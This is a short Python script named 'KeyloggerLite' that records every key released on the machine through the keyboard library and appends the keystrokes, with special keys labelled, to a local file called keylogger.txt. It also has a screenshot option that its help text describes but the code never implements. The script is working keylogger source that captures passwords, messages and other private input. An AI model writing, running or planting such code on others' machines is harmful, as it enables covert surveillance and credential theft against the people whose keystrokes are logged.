import datetime
import argparse
import keyboard
import time
import pyautogui

# dict for converting special keys
special_key_dict = {'space': '<spacebar>',
                    'enter': '<enter_key>',
                    'up': '<up_key>',
                    'backspace': '<backspace>'}


class keyloglite:
    def __init__(self):
        # by default screenshots are disabled
        self.screenshotmode = False
        self.logstring = ""

    # recursive function to record keystrokes, store into logstring var
    def key_event(self, event):
        stroke = event.name
        if stroke in special_key_dict:
            stroke = special_key_dict[stroke]
            self.logstring += stroke
        else:
            self.logstring += stroke
        # every 10 characters, the logstring will be written to the logger
        if len(self.logstring) > 10:
            file = open("keylogger.txt", "a")
            file.write(self.logstring)
            # clear the logstring when its been written
            self.logstring = ""

    def main(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('--sm', '--screenshot',
                            default=False,
                            action='store_true',
                            help='Enable screenshot mode, this will save screenshots every 60 seconds to a local dir '
                                 'called "keylog_screenshots"')
        args = parser.parse_args()
        if args.sm:
            print('okay lol')
        print("Started KeyloggerLite")
        file = open("keylogger.txt", "a")
        file.write(str(datetime.datetime.now()) + " keylogger started\n")
        # record keystrokes and add to logstring
        keyboard.on_release(self.key_event)
        keyboard.wait()


keylogliteobj = keyloglite()
keylogliteobj.main()
